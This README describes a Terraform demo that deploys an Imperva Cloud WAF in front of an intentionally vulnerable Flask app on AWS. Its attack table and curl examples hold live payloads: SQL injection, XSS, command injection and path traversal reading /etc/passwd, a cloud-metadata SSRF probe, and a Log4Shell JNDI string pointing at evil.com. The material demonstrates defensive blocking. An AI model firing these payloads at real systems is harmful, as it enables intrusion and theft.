# Imperva Cloud WAF (Imperva for AWS / vPoP) Demo Application

An end-to-end automated demonstration environment for **Imperva Cloud WAF (Imperva for AWS / vPoP)** on Amazon Web Services (AWS) using Terraform and the official `imperva/incapsula` provider.

---

## 🏛️ Architecture Overview

```
[ Client / Attacker / Browser ]
             │ (HTTPS)
             ▼
   [ AWS CloudFront Edge ]
             │ Origin: imperva_origin_domain
             │ Header: x-impv-origin-domain
             ▼
   [ Imperva Cloud WAF (vPoP) ]
     ├─ OWASP Top 10 Web Engine
     ├─ API Security & BOLA Protection
     ├─ Advanced Bot Protection (ABP)
     └─ Zero-Day Virtual Patching
             │ (Clean traffic only)
             ▼
   [ AWS Application Load Balancer (ALB) ]
             │
             ▼
   [ EC2 Demo Web Application (Flask / OWASP Top 10) ]
```

### Key Integration Points
1. **AWS CloudFront Origin**: Pointed directly to `imperva_origin_domain` (the Incapsula CNAME provided upon site onboarding).
2. **Custom Origin Header**: Injects `x-impv-origin-domain: <imperva_origin_domain>` into origin requests.
3. **Origin Request Policy**: Uses AWS Managed `Managed-AllViewerAndCloudFrontHeaders` so headers and client metadata are forwarded to Imperva.
4. **Cache Policy**: Uses AWS Managed `Managed-CachingDisabled` to ensure all dynamic attack payloads are forwarded for real-time inspection.
5. **Imperva Data Center**: Configured with the AWS ALB DNS name as the single origin data center.

---

## 📁 Repository Structure

```
vPoP Demo App/
├── var.tf                      # All input variables (AWS_region, tags, Incapsula keys, domain)
├── terraform.tfvars.example    # Configuration template for easy setup
├── versions.tf                 # Terraform and Provider version requirements
├── providers.tf                # AWS and Imperva (Incapsula) provider definitions
├── vpc.tf                      # Multi-AZ VPC, Subnets, Internet Gateway, Routing
├── security_groups.tf          # ALB and EC2 Security Groups
├── alb.tf                      # AWS ALB, Target Group, and HTTP Listener
├── ec2.tf                      # EC2 Instance with encrypted EBS, SCP compliance & auto-deploy
├── incapsula.tf                # Imperva site_v3 (PUBLIC_CLOUD / AWS) and cloud_origin_domain
├── cloudfront.tf               # CloudFront distribution with Imperva origin & custom header
├── outputs.tf                  # Endpoints, Site ID, Origin Domain, and cURL commands
├── app/                        # Demo Application Codebase
│   ├── app.py                  # Flask backend with full OWASP Web & API Top 10 suites
│   ├── templates/index.html    # Modern CyberSec Glassmorphism Web Portal
│   └── static/
│       ├── style.css           # Thales/Imperva theme styling
│       └── app.js              # Interactive AJAX attack simulator and live header inspector
└── README.md                   # This guide
```

---

## ⚙️ Prerequisites

1. **Terraform**: CLI version `>= 1.3.0` installed.
2. **AWS Account**: Configured AWS credentials with permissions for VPC, EC2, IAM, ALB, and CloudFront.
3. **Imperva Account**:
   - `incapsula_api_id` & `incapsula_api_key` (obtained from *Imperva Management Console -> Account Settings -> API Keys*).
   - A domain name (e.g. `demo.yourdomain.com`) for site onboarding (`alternative_domain_name`).

---

## 🚀 Deployment Instructions

### 1. Configure Variables
Copy `terraform.tfvars.example` to `terraform.tfvars`:
```bash
cp terraform.tfvars.example terraform.tfvars
```

Edit `terraform.tfvars` with your settings:
```hcl
AWS_region              = "us-east-1"
tag_name                = "imperva-vpop-demo-app"
tag_owner_email         = "danny.milshtein@thalesgroup.com"
tag_manager_email       = "manager@thalesgroup.com"
tag_team_email          = "cybersec-se-team@thalesgroup.com"
tag_description         = "vPoP Demo App for AWS"
tag_environment         = "SE Demo Lab"
tag_dataclassification  = "THALES GROUP LIMITED DISTRIBUTION"

incapsula_api_id        = "YOUR_API_ID"
incapsula_api_key       = "YOUR_API_KEY"
alternative_domain_name = "demo-vpop.yourdomain.com"
```

### 2. Initialize and Deploy
Initialize Terraform:
```bash
terraform init
```

Deploy the infrastructure (*Note: using `-parallelism=1` is recommended for Imperva API sequential requirements*):
```bash
terraform apply -parallelism=1
```

When deployment finishes, Terraform will output:
- `demo_portal_url`: The CloudFront URL for accessing the demo dashboard.
- `imperva_site_id`: The ID of your site in the Imperva Console.
- `imperva_origin_domain`: The CNAME assigned by Imperva.
- Ready-to-copy cURL test commands.

---

## 🎯 Demo Scenarios & SE Presentation Guide

Open the `demo_portal_url` in your browser. The application includes live tabs:

### 1. OWASP Web Top 10 Demonstration
| Vulnerability | Attack Vector | Expected Result | Imperva Engine |
| :--- | :--- | :--- | :--- |
| **A03: SQL Injection** | `' OR '1'='1' --` | **HTTP 403 Forbidden** | SQLi Syntax Tree Engine |
| **A03: Cross-Site Scripting** | `<script>alert(1)</script>` | **HTTP 403 Forbidden** | XSS Deep Packet Inspection |
| **A03: Command Injection** | `; cat /etc/passwd` | **HTTP 403 Forbidden** | OS Command Injection Shield |
| **A01: Path Traversal (LFI)** | `../../../../etc/passwd` | **HTTP 403 Forbidden** | Illegal Resource Access |
| **A10: SSRF** | `http://169.254.169.254/...` | **HTTP 403 Forbidden** | SSRF Metadata Protection |
| **A06: Log4Shell (CVE-2021-44228)** | `${jndi:ldap://evil.com/a}` in `X-Api-Version` | **HTTP 403 Forbidden** | Zero-Day Virtual Patching |
| **A05: Security Misconfiguration** | `/.env` or `/.git/config` | **HTTP 403 Forbidden** | Vulnerability Scanner Shield |

### 2. OWASP API Top 10 Demonstration
- **API1: Broken Object Level Authorization (BOLA)**: Demonstrates cross-tenant data access prevention.
- **API3: Mass Assignment**: Demonstrates OpenAPI schema enforcement blocking injected `{"role": "super_admin"}` parameters.
- **API4: Unrestricted Resource Consumption**: High-concurrency OTP flood test demonstrating Adaptive Rate Limiting & Bot Protection.
- **API5: Broken Function Level Auth (BFLA)**: Restricted administrative function validation.
- **API9: Shadow / Deprecated APIs**: Live API Discovery categorization.

### 3. Live Header & Request Inspector
Shows the real-time headers passed from CloudFront through Imperva into the backend, including `x-impv-origin-domain`, `CloudFront-Viewer-Country`, and `X-Forwarded-For`.

---

## 💻 CLI Verification (Terminal)

Test blocking directly from your terminal:

```bash
# 1. SQL Injection
curl -i -s "https://YOUR_CLOUDFRONT_DOMAIN/api/vulnerabilities/sqli?query=%27%20OR%20%271%27=%271%27%20--"

# 2. Command Injection
curl -i -s "https://YOUR_CLOUDFRONT_DOMAIN/api/vulnerabilities/rce?cmd=%3B%20cat%20%2Fetc%2Fpasswd"

# 3. Path Traversal
curl -i -s "https://YOUR_CLOUDFRONT_DOMAIN/api/vulnerabilities/lfi?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# 4. Log4Shell Header Injection
curl -i -s -H "X-Api-Version: \${jndi:ldap://evil.com/a}" "https://YOUR_CLOUDFRONT_DOMAIN/api/vulnerabilities/log4shell"
```

---

## 🧹 Cleanup & Teardown

To destroy all created resources:
```bash
terraform destroy -parallelism=1
```
